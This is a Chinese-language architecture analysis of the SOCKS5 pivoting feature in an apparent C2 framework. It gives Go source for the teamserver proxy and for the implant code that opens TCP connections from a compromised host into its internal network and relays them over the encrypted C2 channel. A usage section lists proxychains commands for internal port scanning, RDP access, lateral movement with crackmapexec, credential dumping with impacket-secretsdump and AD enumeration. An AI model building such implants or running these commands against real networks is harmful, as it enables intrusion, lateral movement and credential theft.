# SOCKS5 代理架构完整分析

> 项目：C2 Framework  
> 分析日期：2026-07-01  
> 分支：dev

---

## 一、核心问题回答

### SOCKS5 端口开在哪里？

**SOCKS5 监听端口开在 C2 Teamserver 机器上，而不是 implant 端。** 但实际的 TCP 目标连接是由 implant 发起的。

具体来说：
- **Teamserver** 在本机调用 `net.Listen("tcp", ":1080")` 开启 SOCKS5 监听器
- **Implant** 收到 tunnel 命令后，从被控机器发起真实的 TCP 连接到内网目标
- 数据通过已有的加密 C2 通道进行双向中继

---

## 二、完整流程图

```
外部 SOCKS5 客户端          Teamserver                      Implant              目标主机
 (你的攻击机)                  |                               |                    |
     |                         |                               |                    |
     |-- SOCKS5 握手 -------->|                               |                    |
     |                         | [TCP :1080 监听器]           |                    |
     |-- CONNECT 10.0.0.5 -->|                               |                    |
     |                         |-- MsgTunnelConnect --------->|                    |
     |                         |   (tunnelID, "10.0.0.5:3389")|-- TCP Dial ------->|
     |                         |<-- MsgTunnelConnected -------|                    |
     |<-- SOCKS5 OK ----------|                               |                    |
     |                         |                               |                    |
     |=== 数据双向中继 ===========================================================>|
     |                         |                               |                    |
     |  你的工具发出的数据      |   MsgTunnelData              |   TCP Write        |
     |                         |   MsgTunnelData              |   TCP Read         |
     |                         |                               |                    |
     |=== 关闭连接 ===============================================================>|
     |                         |   MsgTunnelClose             |   TCP Close        |
```

---

## 三、分步详解

### 第一步：管理员触发（Web UI 或 API）

管理员在 AgentList 中右键点击某个 agent，选择 "SOCKS proxy"，输入端口（默认 1080），点击启动。

对应 HTTP 请求：
```
POST /api/v1/agents/:id/socks
Body: {"port": 1080}
Authorization: Bearer <jwt_token>
```

### 第二步：Teamserver 开启 SOCKS5 监听器

代码路径：`internal/teamserver/server.go` → `handleStartSocks()` → `socksRegistry.Start()` → `SocksManager.Start()` → `net.Listen("tcp", ":1080")`

关键代码在 `internal/teamserver/socks5/manager.go` 的 `Start()` 方法：
```go
func (m *SocksManager) Start(port int) error {
    // 创建 go-socks5 服务器，注入自定义 Dial 函数
    config := &socks5.Config{
        Dial: m.Dial,  // <-- 关键：替换默认的 TCP 拨号
    }
    server, _ := socks5.New(config)
    
    // 在 Teamserver 本机开启 TCP 监听
    listener, _ := net.Listen("tcp", fmt.Sprintf(":%d", port))
    
    // 启动 SOCKS5 服务
    go server.Serve(listener)
}
```

### 第三步：外部工具连接 SOCKS5 并请求目标

当 proxychains 或浏览器配置 SOCKS5 代理指向 `teamserver:1080` 并请求连接内网目标时：

1. `github.com/armon/go-socks5` 库处理 SOCKS5 握手（无认证）
2. 库调用自定义的 `Dial` 函数
3. `Dial` 函数**不做真实的 TCP 连接**，而是：
   - 生成 UUID 作为 TunnelID
   - 创建 `TunnelSession`（包含 connectCh、dataCh、closeCh 通道）
   - 通过 C2 通道发送 `MsgTunnelConnect` 给 implant

关键代码在 `manager.go` 的 `Dial()` 方法：
```go
func (m *SocksManager) Dial(ctx context.Context, network, addr string) (net.Conn, error) {
    tunnelID := uuid.New().String()
    
    session := &TunnelSession{
        tunnelID:  tunnelID,
        dataCh:    make(chan []byte, 128),  // 缓冲区 128 条
        closeCh:   make(chan struct{}),
        connectCh: make(chan TunnelConnected),
    }
    m.tunnels[tunnelID] = session
    
    // 通过 C2 通道发送连接命令给 implant
    m.sendMsg(protocol.MsgTunnelConnect, &protocol.TunnelConnect{
        TunnelID: tunnelID,
        Target:   addr,  // 例如 "10.0.0.5:3389"
    })
    
    // 等待 implant 的连接结果（30秒超时）
    select {
    case result := <-session.connectCh:
        if result.Success {
            // 返回 RelayConn（实现 net.Conn 接口）
            return NewRelayConn(tunnelID, addr, session.dataCh, m.sendTunnelMsg, m.onTunnelClose), nil
        }
    case <-time.After(30 * time.Second):
        return nil, fmt.Errorf("tunnel connect timeout")
    }
}
```

### 第四步：Implant 发起真实 TCP 连接

Implant 的 reader goroutine 收到 `MsgTunnelConnect`（消息类型 0x10）：

代码路径：`internal/implant/implant.go` → `internal/implant/tunnel.go`

```go
func handleTunnelConnect(msg *protocol.TunnelConnect, serverConn net.Conn, key []byte) {
    // 从被控机器发起 TCP 连接到目标
    targetConn, err := net.DialTimeout("tcp", msg.Target, 10*time.Second)
    
    if err != nil {
        // 连接失败，回复失败消息
        SendFrameSafe(serverConn, MsgTunnelConnected, &TunnelConnected{
            TunnelID: msg.TunnelID,
            Success:  false,
            Error:    err.Error(),
        }, key)
        return
    }
    
    // 连接成功，回复成功消息
    SendFrameSafe(serverConn, MsgTunnelConnected, &TunnelConnected{
        TunnelID: msg.TunnelID,
        Success:  true,
    }, key)
    
    // 创建 TunnelSession 并启动 relay goroutine
    session := &TunnelSession{Conn: targetConn, ctx: ctx, cancel: cancel}
    tunnelSessions[msg.TunnelID] = session
    
    // 从目标连接读取数据，发送回 teamserver
    go func() {
        buf := make([]byte, 32*1024)
        for {
            n, err := targetConn.Read(buf)
            if err != nil {
                // 发送关闭消息
                SendFrameSafe(serverConn, MsgTunnelClose, &TunnelClose{msg.TunnelID}, key)
                break
            }
            // 发送数据回 server
            SendFrameSafe(serverConn, MsgTunnelData, &TunnelData{msg.TunnelID, buf[:n]}, key)
        }
    }()
}
```

### 第五步：数据双向中继

**出站方向（你的工具 → 内网目标）：**

```
1. SOCKS5 客户端 write 数据
2. RelayConn.Write() → 封装为 MsgTunnelData → 加密 → 发到 implant 的 TCP 连接
3. Implant 的 handleTunnelData() → 写入目标的 TCP 连接
```

**入站方向（内网目标 → 你的工具）：**

```
1. Implant 的 relay goroutine 从目标连接 read 数据
2. 封装为 MsgTunnelData → 加密 → 发到 teamserver
3. teamserver 的 agentLoop() 收到 → socksRegistry.RouteData()
4. 放入 session.dataCh 通道
5. RelayConn.Read() 从通道读取 → 返回给 SOCKS5 客户端
```

### 第六步：连接关闭

任一方向关闭：
- **SOCKS 客户端关闭** → RelayConn.Close() → 发 MsgTunnelClose 给 implant → implant 关闭目标连接
- **目标关闭连接** → implant relay goroutine 检测到 read error → 发 MsgTunnelClose 给 teamserver → 关闭 RelayConn

---

## 四、协议设计

### 4 个隧道专用消息类型

在 `pkg/protocol/constants.go` 中定义：

```go
MsgTunnelConnect   uint32 = 0x10  // Server → Implant: 打开隧道连接目标
MsgTunnelConnected uint32 = 0x11  // Implant → Server: 连接结果
MsgTunnelData      uint32 = 0x12  // 双向: 隧道数据块
MsgTunnelClose     uint32 = 0x13  // 双向: 关闭隧道
```

### 消息结构体

在 `pkg/protocol/messages.go` 中定义：

```go
type TunnelConnect struct {
    TunnelID string  // UUID，唯一标识一个隧道连接
    Target   string  // "host:port" 格式，如 "10.0.0.5:3389"
}

type TunnelConnected struct {
    TunnelID string
    Success  bool
    Error    string  // 仅失败时有值
}

type TunnelData struct {
    TunnelID string
    Data     []byte
}

type TunnelClose struct {
    TunnelID string
}
```

### 线缆格式

```
[4 字节总长度][4 字节消息类型][可变长度加密载荷]
                     ↑                    ↑
              Gob 序列化的消息体    AES-256-GCM 加密
```

---

## 五、关键架构设计

### 1. RelayConn：核心桥接技巧

`internal/teamserver/socks5/relay.go` 中的 `RelayConn` 实现了标准 `net.Conn` 接口，但底层用 Go channel 桥接非同步的消息协议：

```go
type RelayConn struct {
    tunnelID  string
    addr      string
    dataCh    chan []byte        // 接收来自 implant 的数据
    buf       []byte             // Read() 的剩余缓冲区
    readCh    chan []byte        // 内部读取通道
    closeCh   chan struct{}
    closed    int32              // 原子标志
    // ...
}

// Read 从通道读取（阻塞等待 implant 发来的数据）
func (r *RelayConn) Read(b []byte) (int, error) { ... }

// Write 将数据封装为 MsgTunnelData 发给 implant
func (r *RelayConn) Write(b []byte) (int, error) { ... }

// Close 发送 MsgTunnelClose 给 implant
func (r *RelayConn) Close() error { ... }
```

### 2. 绕过心跳机制

隧道消息（0x10-0x13）在 implant 的 reader goroutine 中**直接分发处理**，不经过心跳/任务轮询机制：

```go
// implant.go 的 reader goroutine
switch msgType {
case protocol.MsgTunnelConnect:
    go handleTunnelConnect(msg, conn, sessionKey)   // 直接处理
case protocol.MsgTunnelData:
    go handleTunnelData(msg)                        // 直接处理
case protocol.MsgTunnelClose:
    handleTunnelClose(msg)                          // 直接处理
case protocol.MsgTaskResponse:
    taskResponseCh <- msg                           // 走任务通道
}
```

这意味着隧道流量实时传输，不受 implant heartbeat interval 的影响。

### 3. 线程安全

- **Implant 端**：`comm.go` 中的 `writeMu` 全局互斥锁保护 TCP 写入
- **Teamserver 端**：`AgentState.writeMu` 保护写入
- **双向**：`tunnel sessions map` 由各自端的 mutex 保护

### 4. 单连接多路复用

所有 SOCKS5 连接共享同一个 implant-teamserver TCP 连接，通过 `TunnelID` 区分不同的 SOCKS 会话。

---

## 六、与 Cobalt Strike / VShell 的对比

### 架构模式对比

| 特性 | 本项目 | Cobalt Strike | VShell |
|------|--------|---------------|--------|
| SOCKS 监听位置 | Teamserver 端 | Teamserver 端 | Server 端 |
| 实际 TCP 连接 | Implant 发起 | Beacon 发起 | Agent 发起 |
| 通信通道 | 复用已有 C2 连接 | 复用已有 C2 连接 | 复用已有 C2 连接 |
| 多路复用 | TunnelID | Channel ID | Session ID |

三者架构模式**一致**：都是 Server 开端口 → 客户端连 Server → Server 通过 C2 通道让 Agent 去连目标。

### 详细差异

| 维度 | 本项目 | Cobalt Strike | VShell |
|------|--------|---------------|--------|
| SOCKS 版本 | SOCKS5 only | SOCKS4 + SOCKS5 | SOCKS5 |
| SOCKS 认证 | 无认证 | 可配置凭据 | 通常绑定 localhost |
| UDP ASSOCIATE | 不支持 | 支持 | 视版本 |
| 域名解析(SOCKS4a) | 不支持 | 支持 | 不支持 |
| 连接超时 | 30 秒硬编码 | 可配置 | 可配置 |
| 数据缓冲区 | 128 条，满即丢旧数据 | 更成熟的流控 | 类似 |
| 心跳影响 | 绕过心跳，实时传输 | 受 sleep/jitter 影响 | 视实现 |
| 持久化 | 仅内存，重启丢失 | 仅内存 | 仅内存 |

### 本项目的潜在问题

1. **缓冲区溢出丢数据**：`dataCh` 满 128 条后，`RouteData()` 会丢弃旧数据而不是阻塞等待（`manager.go:210-221`），高吞吐场景下可能丢数据
2. **无 SOCKS 认证**：任何能连到 teamserver SOCKS 端口的人都能使用代理
3. **无 UDP 支持**：部分需要 UDP 的场景无法使用（如某些 DNS 查询）
4. **无连接池/限流**：没有对并发连接数的上限控制

---

## 七、能否访问目标内网？

**完全可以。** 这正是 SOCKS5 代理在 C2 框架中的核心目的。

### 原理

```
你的攻击机                      Teamserver                     被控机器                内网目标
(172.16.1.100)                  (公网 IP)                      (10.0.0.17)           (10.0.0.5)

proxychains ──→ SOCKS5:1080 ──→ C2加密通道 ──→ Implant ──→ TCP:3389 ──→ 内网 Windows 服务器
                                                     │
                                                     ├──→ TCP:445 ──→ 内网文件服务器
                                                     ├──→ TCP:1433 ──→ 内网数据库
                                                     └──→ TCP:389 ──→ 域控制器
```

Implant 从**被控机器的网络位置**发起 TCP 连接，所以它能访问被控机器能访问的一切内网资源。

### 实际使用

```bash
# 1. 在 Web UI 中右键 Agent，启动 SOCKS5，端口 1080

# 2. 配置 proxychains
# /etc/proxychains4.conf:
[ProxyList]
socks5 <teamserver_ip> 1080

# 3. 通过代理操作内网
proxychains4 nmap -sT -Pn 10.0.0.0/24         # 端口扫描
proxychains4 xfreerdp /v:10.0.0.5             # 远程桌面
proxychains4 crackmapexec smb 10.0.0.0/24     # 横向移动
proxychains4 impacket-secretsdump DOMAIN/admin:pass@10.0.0.5  # 凭据导出
proxychains4 bloodhound-python -d DOMAIN -u user -p pass -ns 10.0.0.5  # AD 枚举
```

---

## 八、相关文件清单

### 核心后端

| 文件 | 作用 |
|------|------|
| `internal/teamserver/socks5/manager.go` | SocksManager：SOCKS5 服务器包装 + 自定义 Dial |
| `internal/teamserver/socks5/relay.go` | RelayConn：net.Conn 接口的通道实现 |
| `internal/teamserver/socks5/server.go` | ProxyRegistry：agentID → SocksManager 注册中心 |
| `internal/implant/tunnel.go` | implant 端隧道处理（connect/data/close） |
| `internal/implant/implant.go` | implant 主循环，reader goroutine 分发隧道消息 |
| `internal/implant/comm.go` | 线程安全的 SendFrameSafe |
| `internal/teamserver/agent/handler.go` | agentLoop：接收隧道消息并路由到 socksRegistry |
| `internal/teamserver/agent/manager.go` | AgentState.SendMessage（线程安全的消息发送） |
| `internal/teamserver/server.go` | HTTP API 端点 + 路由注册 |

### 协议定义

| 文件 | 作用 |
|------|------|
| `pkg/protocol/constants.go` | 消息类型常量（0x10-0x13） |
| `pkg/protocol/messages.go` | 隧道消息结构体 |
| `pkg/protocol/envelope.go` | 线缆格式封装 |
| `pkg/protocol/serializer.go` | Gob 序列化/反序列化 |

### 前端

| 文件 | 作用 |
|------|------|
| `web/src/components/SocksModal.tsx` | SOCKS 控制面板（启动/停止/状态） |
| `web/src/components/AgentList.tsx` | 右键菜单 "SOCKS proxy" 入口 |
| `web/src/api/socks.ts` | 前端 API 封装 |
| `web/src/types/index.ts` | SocksStatus 类型定义 |
